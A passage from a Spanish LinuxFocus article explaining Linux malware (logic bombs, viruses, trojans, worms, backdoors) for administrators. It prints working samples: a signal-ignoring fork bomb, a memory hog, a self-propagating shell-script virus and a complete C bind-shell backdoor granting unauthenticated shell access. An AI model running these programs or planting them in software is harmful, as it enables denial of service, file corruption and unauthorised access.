   y evitar&aacute; cualquier conexi&oacute;n que intente matarlo:</p>

<pre>
  #include &lt;signal.h&gt;
  #include &lt;unistd.h&gt;

  int
main (void)
{
  int i;
  for (i = 0; i &lt; NSIG; i ++)
signal (i, SIG_IGN);
  while (1)
fork ();
}
</pre>

<p>Los l&iacute;mites que se pueden establecer para los usuarios
(con la llamada de sistema <code>setrlimit()</code> y la
funci&oacute;n de shell <code>ulimit</code>) permiten acortar
la vida de este tipo de programas, pero s&oacute;lo act&uacute;an tras un tiempo
en el que el sistema no est&aacute; disponible.</p>

<p>En el mismo orden de ideas, un programa como el siguiente
utiliza toda la memoria disponible y entra en un bucle "devorando"
los ciclos de CPU, perturbando el funcionamiento de los otros
procesos:</p>

<pre>
  #include &lt;stdlib.h&gt;

  #define LG      1024

  int
main (void) {
  char * buffer;
  while ((buffer = malloc (LG)) != NULL)
 memset (buffer, 0, LG);
  while (1)
;
}
</pre>

<p>Habitualmente este programa es aniquilado autom&aacute;ticamente
por el mecanismo de gesti&oacute;n de memoria virtual en las &uacute;ltimas
versiones del n&uacute;cleo. Pero antes de esto, el n&uacute;cleo puede matar
otras tareas que requieran un mont&oacute;n de memoria y luego est&eacute;n
inactivas (como aplicaciones X11, por ejemplo).
Adem&aacute;s, los dem&aacute;s procesos que requieran memoria
no la obtendr&aacute;n, lo que a  menudo les llevar&aacute; a su terminaci&oacute;n.</p>

<p>Poner fuera de servicio caracter&iacute;sticas de red es tambi&eacute;n
bastante simple, sobrecargando el correspondiente puerto
con continuas peticiones de conexi&oacute;n. Existen soluciones
para impedirlo pero no siempre est&aacute;n implementadas por
el administrador. Vemos que bajo Linux, incluso si una bomba
l&oacute;gica se lanza por un usuario normal, no puede destruir ficheros
que no le pertenezcan, pero puede ser muy molesta.
Es suficiente con combinar unos pocos <code>fork()</code>,
<code>malloc()</code> y <code>connect()</code>
para dejar malparado el sistema y los servicios de red.</p>

<A NAME="255lfindex8">&nbsp;</A>
<H3>Virus</H3>

<table>
<tr><td bgcolor="#AAAAAA">
<pre>
Asunto: Virus Unix

HAS RECIBIDO UN VIRUS UNIX

Este virus funciona seg&uacute;n un principio cooperativo:

Si usas Linux o Unix, por favor env&iacute;a este correo a tus amigos
y destruye aleatoriamente algunos ficheros de tu sistema.
</pre>
</td></tr></table>

<p>A pesar de la extendida idea, los virus pueden ser una amenaza
en Linux. Existen varios. Lo que es cierto es que un virus en
Linux no encontrar&aacute; un lugar fruct&iacute;fero para propagarse. Primero,
veamos la fase de infecci&oacute;n de una m&aacute;quina. El c&oacute;digo del virus
se debe ejecutar en ella. Lo que significa que se ha copiado un
ejecutable corrupto desde otro sistema. En el mundo Linux,
la pr&aacute;ctica com&uacute;n es pasar una aplicaci&oacute;n a alguien d&aacute;ndole
la <em>URL</em> donde encontrar el software en lugar
de enviarle ficheros ejecutables. Es decir, el virus vendr&aacute; de un
sitio oficial, donde se puede detectar r&aacute;pidamente. Una vez que
una m&aacute;quina se ha infectado, para conseguir extender el virus,
deber&iacute;a usarse como una plataforma de distribuci&oacute;n para aplicaciones
precompiladas, lo que es muy infrecuente. El hecho es que un
fichero ejecutable no es un buen medio de transporte para una
bomba l&oacute;gica en el mundo del software libre.</p>

<p>En lo que se refiere a la propagaci&oacute;n dentro de una m&aacute;quina,
obviamente una aplicaci&oacute;n corrupta s&oacute;lo puede extenderse a los
ficheros  sobre los que el usuario que la ejecuta tenga permisos
de escritura. El administrador prudente s&oacute;lo trabajar&aacute; como
<em>root</em> para operaciones que realmente necesiten
privilegios, no es deseable ejecutar un nuevo software cuando
se est&aacute; conectado como <em>root</em>. Aparte de la instalaci&oacute;n
de una aplicaci&oacute;n con <em>Set-UID root</em>, el riesgo es
bastante peque&ntilde;o. Cuando un usuario normal ejecute un
programa infectado, el virus s&oacute;lo afectar&aacute; a los ficheros que
pertenezcan a este usuario, lo prevendr&aacute; la propagaci&oacute;n a las
utilidades del sistema.</p>

<p>Si los virus han representado una utop&iacute;a en Unix por mucho tiempo,
es tambi&eacute;n debido a la diversidad de procesadores (y por tanto de los
lenguajes ensambladores) y de librer&iacute;as (y por tanto de los objetos
referenciados) lo que ha limitado el rango de c&oacute;digo precompilado.
Hoy esto no es as&iacute;, y los virus que infectaran los ficheros ELF compilados
para Linux en un procesador i386 con GlibC 2.1 encontrar&iacute;an
un mont&oacute;n de objetivos. Adem&aacute;s un virus podr&iacute;a escribirse
en un lenguaje que no dependiera del host en el que se ejecutara.
Por ejemplo, aqu&iacute; est&aacute; un virus para scripts de shell. Intenta
introducirse en todos los scripts de shell encontrados bajo el
directorio en el que se ejecuta. Para no infectar el mismo script
m&aacute;s de una vez, el virus ignora los ficheros que tienen en la segunda
l&iacute;nea el comentario "infectado" o "vacunado".</p>

<pre>
#! /bin/sh
# infectado

( tmp_fic=/tmp/$$
candidatos=$(find . -type f -uid $UID -perm -0755)
for fic in $candidatos ; do
    exec &lt; $fic
    # Intenta leer la primera l&iacute;nea,
    if  ! read line ; then
            continue
    fi
    # y verifica que sea un script.
    if [ "$line" != "#!/bin/sh" ] &amp;&amp; [ "$line" != "#! /bin/sh" ] ;
then
            continue
    fi
    # Lee la segunda l&iacute;nea.
    if ! read line ; then
            continue
    fi
    # &iquest;Est&aacute; ya el fichero infectado o vacunado?
    if [ "$line" == "# vacunado" ] || [ "$line" == "# infectado" ] ; then
            continue
    fi
    # Sino lo infectamos: copiamos el cuerpo del virus,
    head -33 $0 &gt; $tmp_fic
    # y el fichero original.
    cat $fic &gt;&gt; $tmp_fic
    # Sobreescribimos el fichero original.
    cat $tmp_fic &gt; $fic
done
 rm -f $tmp_fic
) 2&gt;/dev/null &amp;
</pre>

<p>El virus no se preocupa de esconderse o de esconder su acci&oacute;n,
excepto que se ejecuta en segundo plano mientras permite
al script original hacer su trabajo usual. Por supuesto, &iexcl;no ejecute
este script como <em>root</em>! Sobre todo si cambia <code>find
.</code> por <code>find /</code>. A pesar de la simplicidad de este
programa, es muy f&aacute;cil perder su control, sobre todo si el sistema
contiene muchos scripts personalizados.</p>

<p>La tabla 1 contiene informaci&oacute;n sobre los virus m&aacute;s conocidos en Linux.
Todos ellos infectan ficheros ejecutables ELF insertando su
c&oacute;digo despu&eacute;s de la cabecera del fichero y colocando detr&aacute;s el resto
del c&oacute;digo original. A menos que se indique lo contrario, buscan
objetivos potenciales en los directorios del sistema. En esta
tabla, vemos que los virus en Linux no son puramente anecd&oacute;ticos,
aun cuando no sea demasiado alarmante, mayormente porque hasta
ahora esos virus son inofensivos.</p>

<table border="3" frame="border" class="TextInfo">
  <caption>
    Tabla 1 - Virus en Linux
  </caption>

  <tr>
    <td><em>Nombre</em></td>

    <td><em>Bomba L&oacute;gica</em></td>

    <td><em>Notas</em> </td>
  </tr>

  <tr>
    <td>Bliss</td>

    <td>Aparentemente inactiva</td>

    <td>Desinfecci&oacute;n autom&aacute;tica del fichero ejecutable si
    se llama con la opci&oacute;n <code>--bliss-disinfect-files-please</code>
    </td>
  </tr>

  <tr>
    <td>Diesel</td>

    <td>Ninguna</td>

    <td>&nbsp;</td>
  </tr>

  <tr>
    <td>Kagob</td>

    <td>Ninguna</td>

    <td>Usa un fichero temporal para ejecutar el programa
    original infectado</td>
  </tr>

  <tr>
    <td>Satyr</td>

    <td>Ninguna</td>

    <td>&nbsp;</td>
  </tr>

  <tr>
    <td>Vit4096</td>

    <td>Ninguna</td>

    <td>S&oacute;lo infecta los ficheros en el directorio actual.</td>
  </tr>

  <tr>
    <td>Winter</td>

    <td>Ninguna</td>

    <td>El c&oacute;digo del virus ocupa 341 bytes. S&oacute;lo infecta los ficheros
    del directorio actual.</td>
  </tr>

  <tr>
    <td>Winux</td>

    <td>Ninguna</td>

    <td>Este virus alberga dos c&oacute;digos diferentes, y puede infectar
    tanto ficheros Windows como ficheros Elf Linux. Sin embargo
    es incapaz de explorar otras particiones que en la que est&aacute;
    alojado, lo que reduce su propagaci&oacute;n.</td>
  </tr>

  <tr>
    <td>ZipWorm</td>

    <td>Inserta un texto "troll" sobre Linux y Windows en los
    ficheros Zip que encuentra. </td>

    <td>&nbsp;</td>
  </tr>
</table>

<p>Como vemos el virus "Winux" es capaz de propagarse tanto
en Linux como en Windows. Es un virus inofensivo y es m&aacute;s una
prueba de posibilidades que un peligro real. Pero este concepto
produce escalofr&iacute;os, al pensar que un intruso podr&iacute;a saltar de
una partici&oacute;n a otra, invadir una red heterog&eacute;nea usando servidores
Samba, etc. La erradicaci&oacute;n ser&iacute;a dif&iacute;cil ya que las herramientas
requeridas deber&iacute;an estar disponibles para ambos sistemas a la vez.
Es importante tener en cuenta que el mecanismo de protecci&oacute;n
de Linux que impide a los virus que trabajan bajo la identidad
de un usuario normal corromper los sistemas de ficheros, ya no
est&aacute; disponible si se accede a la partici&oacute;n desde un virus funcionando
en Windows.</p>

<p>Insistamos de nuevo en este punto: toda precauci&oacute;n administrativa
que tome en Linux se vuelve inefectiva si reinicia su m&aacute;quina desde
una partici&oacute;n Windows que "hospede" un eventual virus multiplataforma.
Es un problema para cada m&aacute;quina que use un <em>arranque-dual</em>
con dos sistemas operativos; &iexcl;la protecci&oacute;n general de todo reside
en el mecanismo de seguridad del sistema m&aacute;s d&eacute;bil! La &uacute;nica soluci&oacute;n
es evitar el acceso a particiones Linux desde una aplicaci&oacute;n Windows
usando un sistema de ficheros encriptados. Esto no est&aacute; todav&iacute;a muy
extendido, y podemos apostar que los virus que ataquen particiones
desmontadas pronto representar&aacute;n un significativo peligro para
m&aacute;quinas Linux.</p>

<A NAME="255lfindex9">&nbsp;</A>
<H3>Caballos de Troya</H3>


<p>Los troyanos son tan temibles como los virus y la gente empieza
a ser m&aacute;s consciente de ello. Contrariamente a una bomba l&oacute;gica
transportada por un virus, lo que se encuentra en un troyano ha
sido puesto intencionadamente por un humano. En el mundo del
software libre, desde el autor de una pieza de c&oacute;digo hasta el usuario
final s&oacute;lo hay uno o dos intermediarios (digamos alguien encargado
del proyecto y alguien dedicado a la distribuci&oacute;n). Si se descubre un
troyano es f&aacute;cil encontrar al "culpable".</p>

<p>El mundo del software libre est&aacute; por tanto bastante bien protegido
contra los troyanos. Pero estamos hablando del software
libre como lo conocemos hoy en d&iacute;a, con proyectos claramente gestionados,
programadores disponibles y sitios web de referencia. Esto est&aacute;
bastante lejos del <em>shareware</em> o el <em>freeware</em>,
s&oacute;lo disponibles precompilados, distribuidos de forma an&aacute;rquica por
cientos de sitios web (o entregados en CD junto a revistas), donde
el autor s&oacute;lo es conocido por una direcci&oacute;n de correo f&aacute;cil de falsificar;
eso hace un verdadero establo de caballos de Troya.</p>

<p>Tengamos en cuenta que el hecho de tener el c&oacute;digo fuente de
una aplicaci&oacute;n y compilarla no es garant&iacute;a de seguridad.
Por ejemplo una bomba l&oacute;gica da&ntilde;ina puede estar escondida en
el script "<code>configure</code>" (el que se llama durante
"<code>./configure;&nbsp;make</code>") que habitualmente &iexcl;ocupa
unas 2000 l&iacute;neas! Por &uacute;ltimo, pero no menos importante, si el c&oacute;digo
fuente de una aplicaci&oacute;n est&aacute; limpiio y compila; esto no impide al
<code>Makefile</code> esconder una bomba l&oacute;gica, activ&aacute;ndose
durante el "<code>make&nbsp;install</code>" final, &iexcl;que suele
ejecutarse como root!</p>

<p>Por &uacute;ltimo, una importante parte de los virus y troyanos da&ntilde;inos
en Windows, son macros ejecutadas cuando se consulta un documento.
Los paquetes ofim&aacute;ticos en Linux no pueden interpretar esas macros,
al menos por ahora, y el usuario r&aacute;pidamente tiene un exagerado
sentimiento de seguridad. Llegar&aacute; el d&iacute;a en que esas herramientas
sean capaces de ejecutar las macros Basic incluidas en el
documento. El hecho de que los dise&ntilde;adores tengan la mala
idea de dejar a estas macros ejecutar comandos en el sistema
ocurrir&aacute; antes o despu&eacute;s. Seguramente, como para los virus, el
efecto devastador estar&aacute; limitado a los usuarios privilegiados,
pero el hecho de no perder los ficheros del sistema (disponibles
en el CD de instalaci&oacute;n, de todas formas), es un peque&ntilde;&iacute;simo
consuelo para el usuario dom&eacute;stico que acaba de perder todos
sus documentos, sus ficheros fuente, ..., mientras su &uacute;ltima copia
de seguridad es de hace un mes.</p>

<p>Para terminar esta secci&oacute;n sobre troyanos incluidos en los datos,
veamos que existe siempre una forma de molestar al usuario,
incluso sin ser da&ntilde;ino, con algunos ficheros que requieren una
interpretaci&oacute;n. En Usenet, puede ver, de vez en cuando,
ficheros comprimidos multiplic&aacute;ndose a s&iacute; mismos en un pu&ntilde;ado
de ficheros hasta llegar a saturar el disco. Algunos ficheros
Postscript tambi&eacute;n pueden bloquear el int&eacute;rprete (<code>ghostscript</code>
o
<code>gv</code>) despilfarrando tiempo de CPU. No
hay da&ntilde;os, sin embargo hacen al usuario perder tiempo y
estar molesto.</p>

<A NAME="255lfindex10">&nbsp;</A>
<H3>Gusanos</H3>


<p>Linux no exist&iacute;a en 1988 cuando se produjo la difusi&oacute;n del &Iacute;nternet
Worm';
habr&iacute;a sido un objetivo a elegir para este tipo de ataque, la
disponibilidad del c&oacute;digo fuente del software libre hace la b&uacute;squeda
de vulnerabilidades muy sencilla (desbordamiento de buffers, por ejemplo).
La complejidad de escribir un gusano de "buena calidad" reduce
el n&uacute;mero de los realmente activos en Linux. La Tabla 2 presenta
algunos, entre los que est&aacute;n los m&aacute;s extendidos</p>

<p>Los gusanos explotan vulnerabilidades de servidores de red.
Para las estaciones de trabajo ocasionalmente conectadas a Internet
el riesgo es te&oacute;ricamente menor que para los servidores permanentemente
conectados. Sin embargo, la evoluci&oacute;n de las formas de conexi&oacute;n
proporcionadas a los usuarios dom&eacute;sticos (cable, SDL, etc) y la actual
facilidad
de implementaci&oacute;n de los servicios de red (servidores HTTP,
FTP an&oacute;nimo, etc) implica que r&aacute;pidamente pueden  llegar
a afectarnos a todos.</p>

<table border="3" frame="border" class="TextInfo">
  <caption>
    Tabla 2 - Gusanos en Linux
  </caption>

  <tr>
    <td><em>Nombre</em></td>

    <td><em>Vulnerabilidades</em></td>

    <td><em>Notas</em> </td>
  </tr>

  <tr>
    <td>Lion (<code>1i0n</code>)</td>

    <td><code>bind</code> </td>

    <td>Instala una puerta trasera (puerto TCP 10008) y un
    <em>root-kit</em> en la m&aacute;quina invadida. Env&iacute;a informaci&oacute;n
    del sistema a una direcci&oacute;n de correo en China.</td>
  </tr>

  <tr>
    <td>Ramen</td>

    <td><code>lpr</code>, <code>nfs</code>,
    <code>wu-ftpd</code> </td>

    <td>Cambia los ficheros <code>index.html</code> que encuentra</td>
  </tr>

  <tr>
    <td>Adore (Red Worm)</td>

    <td><code>bind</code>, <code>lpr</code>, <code>rpc</code>,
    <code>wu-ftpd</code> </td>

    <td>Instala una puerta trasera en el sistema y env&iacute;a informaci&oacute;n
    a direcciones de correo en China y USA. Instala una versi&oacute;n
    modificada de <code>ps</code> para esconder sus procesos.</td>
  </tr>

  <tr>
    <td>Cheese</td>

    <td>Como Lion</td>

    <td>Worm se introduce como algo bueno, chequeando y eliminando
    las puertas abiertas por <em>Lion</em>.</td>
  </tr>
</table>

<p>Sobre los gusanos, tengamos en cuenta que su crecimiento
es por un tiempo limitado. S&oacute;lo "sobreviven" replic&aacute;ndose de un
sistema a otro, y ya que cuentan con las &uacute;ltimas vulnerabilidades
descubiertas, la r&aacute;pida actualizaci&oacute;n de las aplicaciones objetivo
paran su propagaci&oacute;n. En un futuro cercano, posiblemente los
sistemas dom&eacute;sticos tendr&aacute;n que consultar autom&aacute;ticamente
sitios web de referencia (a diario) -que tendr&aacute;n que ser de confianza-
para encontrar esos parches de seguridad para las aplicaciones
del sistema. Podr&iacute;a volverse necesario para impedir al usuario que
trabaje todo el tiempo como administrador del sistema mientras
que le permite beneficiarse de  aplicaciones desarrolladas en red.</p>

<A NAME="255lfindex11">&nbsp;</A>
<H3>Puertas traseras</H3>


<p>Las puertas traseras son un problema importante, incluso para
el software libre. Por supuesto, cuando est&aacute; disponible
el c&oacute;digo fuente de un programa podemos comprobar, en teor&iacute;a,
qu&eacute; es lo que hace. En realidad muy pocos leen el contenido del fichero
que se han descargado de Internet. Por ejemplo, el siguiente programita
suministra una completa puerta trasera, su peque&ntilde;o
tama&ntilde;o hace posible esconderla dentro de una aplicaci&oacute;n suficientemente
grande. Este programa deriva de un ejemplo de mi libro
<a href="#bib">[BLAESS 00]</a> ilustrando el mecanismo de un
pseudo-terminal. El programa no es de f&aacute;cil lectura ya que
no se han incluido comentarios, para hacerlo m&aacute;s peque&ntilde;o. La mayor&iacute;a
de los errores detectados tambi&eacute;n se han eliminado por la misma
raz&oacute;n. Cuando se ejecuta, abre un servicio TCP/IP en el puerto
mencionado al principio del programa (por defecto 4767) en todos
los interfaces de red de la m&aacute;quina. &iexcl;Cada petici&oacute;n de conexi&oacute;n a ese
puerto acceder&aacute; directamente a un shell sin ninguna autentificaci&oacute;n!</p>

<pre>
#define _GNU_SOURCE 500
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;termios.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

#define ADRESSE_BACKDOOR  INADDR_ANY
#define PORT_BACKDOOR     4767

int
main (void)
{
int                sock;
int                sockopt;
struct sockaddr_in adresse; /* direcci&oacute;n */
socklen_t          longueur; /* longitud */
int                sock2;
int        pty_maitre; /* pty_maestro */
int        pty_esclave; /* pty_esclavo */
char *         nom_pty; /* nombre_pty */
struct termios     termios;
char * args [2] = { "/bin/sh", NULL };
fd_set         set;
char           buffer [4096];
int            n;

sock = socket (AF_INET, SOCK_STREAM, 0);
sockopt = 1;
setsockopt (sock, SOL_SOCKET, SO_REUSEADDR, &amp; sockopt,
sizeof(sockopt));
memset (&amp; adresse, 0, sizeof (struct sockaddr));
adresse . sin_family = AF_INET;
adresse . sin_addr . s_addr = htonl (ADRESSE_BACKDOOR);
adresse . sin_port = htons (PORT_BACKDOOR);
if (bind (sock, (struct sockaddr *) &amp; adresse, sizeof (adresse)))
    exit (1);
listen (sock, 5);
while (1) {
    longueur = sizeof (struct sockaddr_in);
    if ((sock2 = accept (sock, &amp; adresse, &amp; longueur)) &lt; 0)
        continue;
    if (fork () == 0) break;
    close (sock2);
}
close (sock);
if ((pty_maitre = getpt()) &lt; 0) exit (1);
grantpt  (pty_maitre);
unlockpt (pty_maitre);
nom_pty = ptsname (pty_maitre);
tcgetattr (STDIN_FILENO, &amp; termios);
if (fork () == 0) {
    /* Hijo: ejecuci&oacute;n de shell en el
        pseudo-TTY esclavo */
    close (pty_maitre);
    setsid();
    pty_esclave = open (nom_pty, O_RDWR);
    tcsetattr (pty_esclave, TCSANOW, &amp; termios);
    dup2 (pty_esclave, STDIN_FILENO);
    dup2 (pty_esclave, STDOUT_FILENO);
    dup2 (pty_esclave, STDERR_FILENO);
    execv (args [0], args);
    exit (1);
}
/* Padre: copia del socket al pseudo-TTY maestro
    y viceversa */
    tcgetattr (pty_maitre, &amp; termios);
cfmakeraw (&amp; termios);
tcsetattr (pty_maitre, TCSANOW, &amp; termios);
while (1) {
    FD_ZERO (&amp; set);
    FD_SET (sock2, &amp; set);
    FD_SET (pty_maitre, &amp; set);
    if (select (pty_maitre &lt; sock2 ? sock2+1: pty_maitre+1,
         &amp; set, NULL, NULL, NULL) &lt; 0)
        break;
    if (FD_ISSET (sock2, &amp;set)) {
        if ((n = read (sock2, buffer, 4096)) &lt; 0)
            break;
        write (pty_maitre, buffer, n);
    }
    if (FD_ISSET (pty_maitre, &amp;set)) {
        if ((n = read (pty_maitre, buffer, 4096)) &lt; 0)
            break;
        write (sock2, buffer, n);
    }
}
return (0);
}
</pre>

<p>Incluyendo dicho c&oacute;digo en una aplicaci&oacute;n grande
(por ejemplo <code>sendmail</code>) permanecer&aacute; escondido
el tiempo suficiente para permitir infiltraciones piratas.
Adem&aacute;s, algunos son verdaderos maestros en el arte de esconder
el funcionamiento de trozos de c&oacute;digo, como los programas enviados
todos los a&ntilde;os al concurso del IOCC (<em>International Obsfucated C
Code Contest</em>) por ejemplo.</p>

<p>Las puertas traseras no deben ser consideradas s&oacute;lo
como posibilidades te&oacute;ricas. Tales problemas se han encontrado
realmente, por ejemplo en el paquete <em>Piranha</em> de la distribuci&oacute;n
Red-Hat 6.2, que aceptaba una contrase&ntilde;a por defecto. El
juego <em>Quake 2</em> tambi&eacute;n fue sospechoso de esconder
una puerta trasera que permit&iacute;a la ejecuci&oacute;n remota de comandos.</p>

<p>Los mecanismos de puerta trasera pueden esconderse de formas
tan complejas que se vuelven indetectables para la mayor&iacute;a. Un caso
t&iacute;pico es el de los sistemas de encriptaci&oacute;n. Por ejemplo, el sistema
SE-Linux, en funcionamiento, es una versi&oacute;n Linux donde la seguridad
ha sido reforzada con parches suministrados por la NSA. Los
desarrolladores de Linux que hab&iacute;an comprobado los parches
suministrados dijeron que nada <em>parec&iacute;a</em> sospechoso,
pero nadie puede estar seguro y muy pocos tienen los conocimientos
matem&aacute;ticos suficientes para descubrir tales vulnerabilidades.</p>

<A NAME="255lfindex12">&nbsp;</A>
<H2>Conclusi&oacute;n</H2>


<p>Observando estos programas nocivos encontrados en el
mundo Gnu/linux podemos concluir: &iexcl;el software libre no est&aacute;
a salvo de virus, gusanos, troyanos, u otros! Sin ser alarmista,
se debe vigilar las alertas de seguridad que afecten a las aplicaciones
actuales, sobre todo si nos conectamos frecuentemente
a Internet. Es importante tomar buenos h&aacute;bitos desde ahora:
actualizar el software en cuanto se descubran vulnerabilidades;
descargar aplicaciones de sitios web de confianza; comprobar
todo lo que sea posible las firmas PGP o MD5 de los paquetes
descargados. Los m&aacute;s "serios" automatizar&aacute;n la supervisi&oacute;n
de las aplicaciones instaladas, por ejemplo con scripts.</p>

<p>Tenemos que hacer una segunda anotaci&oacute;n: los dos peligros
principales para los sistemas Linux en el futuro ser&aacute;n tanto
las aplicaciones ofim&aacute;ticas que interpreten a ciegas las macros
contenidas en documentos (incluyendo correo electr&oacute;nico), como
los virus multi-plataforma que, incluso ejecut&aacute;ndose en Windows,
invadir&aacute;n ficheros ejecutables encontrados en una partici&oacute;n Linux
de la misma m&aacute;quina. Si el primer problema depende del
entorno del usuario, que podr&iacute;a impedir a sus aplicaciones ofim&aacute;ticas
aceptar cualquier cosa, el segundo es mucho m&aacute;s dif&iacute;cil de resolver,
incluso para un administrador concienzudo. En un futuro muy cercano,
poderosos detectores de virus deber&iacute;an estar implementados
para las estaciones Linux conectadas a Internet; esperemos que
estos proyectos aparezcan muy pronto en el mundo del software
libre.</p>

<a name="bib"> </a>
<A NAME="255lfindex13">&nbsp;</A>
<H2>Bibliograf&iacute;a</H2>


<p>El n&uacute;mero de documentos sobre virus, troyanos y otro software
nocivo es bastante numeroso; hay muchos textos que tratan
de los virus actuales, c&oacute;mo funcionan y qu&eacute; hacen. Por supuesto,
la mayor&iacute;a de los listados afectan a Dos/Windows pero algunos
afectan a Linux. Los art&iacute;culos mencionados aqu&iacute; son sobre todo
cl&aacute;sicos y analizan el mecanismo te&oacute;rico de implementaci&oacute;n.</p>

<ul>
  <li>[BLAESS 00] Christophe Blaess - "<em>Programmation syst&egrave;me en C sous
Linux</em>", Eyrolles, 2000.</li>

  <li>[DEWDNEY 84] A.K. Dewdney - "<em>Computer
  recreations</em>" en <em>Scientific American</em>. Versiones
  escaneadas disponibles en <a href=

"http://www.koth.org/info/sciam/">http://www.koth.org/info/sciam/</a></li>

  <li>[EICHIN 89] Mark W. Eichin &amp; Jon A. Rochlis -
  "<em>With Microscope and Tweezers: An Analysis of the
  Internet Virus of November 1988</em>", MIT Cambridge, 1989.
  Disponible en <a href=

"http://www.mit.edu/people/eichin/virus/main.html">www.mit.edu/people/eichin/virus/main.html</a></li>

  <li>[GIBSON 01] Steve Gibson - "<em>The Strange Tale of the
  Denial of Service Attack Against GRC.COM</em>", 2001.
  Disponible en <a href=
  "http://grc.com/dos/grcdos.htm">http://grc.com/dos/grcdos.htm</a></li>

  <li>[KEHOE 92] Brendan P. Kehoe - "<em>Zen and the Art of the
  Internet</em>", 1992.  Disponible en <a href=

"ftp://ftp.lip6.fr/pub/doc/internet/">ftp://ftp.lip6.fr/pub/doc/internet/</a></li>

  <li>[LUDWIG 91] Mark A. Ludwig - "<em>The Little Black Book
  of Computer Virus</em>", American Eagle Publications Inc.,
  1991.</li>

  <li>[LUDWIG 93] Mark A. Ludwig - "<em>Computer Viruses,
  Artificial Life and Evolution</em>", American Eagle
  Publications Inc., 1993.</li>

  <li>[MARSDEN 00] Anton Marsden - "<em>The rec.games.corewar
  FAQ</em>" disponible en <a href=
  "http://homepages.paradise.net.nz/~anton/cw/corewar-faq.html">
  http://homepages.paradise.net.nz/~anton/cw/corewar-faq.html</a></li>

  <li>[MORRIS 85] Robert T. Morris - "<em>A Weakness in the
  4.2BSD Unix TCP/IP Software</em>", AT&amp;T Bell
  Laboratories, 1985. Disponible en <a href=

"http://www.pdos.lcs.mit.edu/~rtm/">http://www.pdos.lcs.mit.edu/~rtm/</a></li>

  <li>[SPAFFORD 88] Eugene H. Spafford - "<em>The Internet Worm
  Program: an Analysis</em>", Purdue University Technical
  Report CSD-TR-823, 1988. Disponible en <a href=

"http://www.cerias.purdue.edu/homes/spaf/">http://www.cerias.purdue.edu/homes/spaf/</a></li>

  <li>[SPAFFORD 91] Eugene H. Spafford - "<em>The Internet Worm
  Incident</em>", Purdue University Technical Report
  CSD-TR-933, 1991. Disponible en <a href=

"http://www.cerias.purdue.edu/homes/spaf/">http://www.cerias.purdue.edu/homes/spaf/</a>
<br>Ver tambi&eacute;n<b>rfc1135</b>: <a
href="http://www.faqs.org/rfcs/rfc1135.html">The Helminthiasis of the
Internet</a></li>

  <li>[SPAFFORD 94] Eugene H. Spafford - "<em>Computer Viruses
  as Artificial Life</em>", Journal of Artificial Life, MIT
  Press, 1994. Disponible en <a href=

"http://www.cerias.purdue.edu/homes/spaf/">http://www.cerias.purdue.edu/homes/spaf/</a></li>

  <li>[STOLL 89] Clifford Stoll - "<em>The Cuckcoo's egg</em>",
  Doubleday, 1989.</li>

  <li>[THOMPSON 84] Ken Thompson - "<em>Reflections on Trusting
  Trust</em>", Communication of the ACM vol.27 n&deg;8, August
  1984. Reeditado en 1995 y disponible en <a href=

"http://www.acm.org/classics/sep95/">http://www.acm.org/classics/sep95/</a></li>
</ul>





<!-- 2pdaIgnoreStart -->
<A NAME="talkback">&nbsp;</a>
<h2>Formulario de "talkback" para este art&iacute;culo</h2>
Cada art&iacute;culo tiene su propia p&aacute;gina de "talkback". A trav&eacute;s de esa p&aacute;gina puedes enviar un comentario o consultar los comentarios de otros lectores
<center>
<table border="0"  CELLSPACING="2" CELLPADDING="1">
 <tr BGCOLOR="#C2C2C2"><td align=center>
  <table border="3"  CELLSPACING="2" CELLPADDING="1">
   <tr BGCOLOR="#C2C2C2"><td align=center>
    <A href="http://cgi.linuxfocus.org/cgi-bin/lftalkback?anum=255&amp;lang=es"><b>&nbsp;Ir a la p&aacute;gina de "talkback"&nbsp;</b></a>
   </td></tr></table>
</td></tr></table>
</center>

<HR size="2" noshade>
<!-- ARTICLE FOOT -->
<CENTER><TABLE WIDTH="98%">
<TR><TD ALIGN=CENTER BGCOLOR="#9999AA" WIDTH="50%">
<A HREF="../../common/lfteam.html">Contactar con el equipo de LinuFocus</A>
<BR><FONT COLOR="#FFFFFF">&copy; Christophe Blaess, <a href="../../common/copy.html">FDL</a> <BR><a href="http://www.linuxfocus.org">LinuxFocus.org</a></FONT>
<BR><a href="http://cgi.linuxfocus.org/cgi-bin/lfcomment?lang=es&amp;article=article255.html" target="_TOP">Pinchar aqu&iacute; para informar de alg&uacute;n problema o enviar comentarios a LinuxFocus</A><BR></TD>
<TD BGCOLOR="#9999AA">
<!-- TRANSLATION INFO -->
<font size=2>Informaci&oacute;n sobre la traducci&oacute;n:</font>
<TABLE>
  <tr><td><font size="2">fr --&gt; -- : Christophe Blaess (<a href="http://perso.club-internet.fr/ccb/"><font size="1">homepage</font></a>)</font></td></tr>
  <tr><td><font size="2">fr --&gt; en: Georges Tarbouriech &lt;georges.t(at)linuxfocus.org&gt;</font></td></tr>
  <tr><td><font size="2">en --&gt; es: Roberto Hernando (<a href="http://rhernando.ya.st"><font size="1">homepage</font></a>)</font></td></tr>
</TABLE>
</TD>
</TR></TABLE></CENTER>
<p><font size=1>2002-10-06, generated by lfparser version 2.21</font></p>
<!-- 2pdaIgnoreStop -->
</BODY>
</HTML>
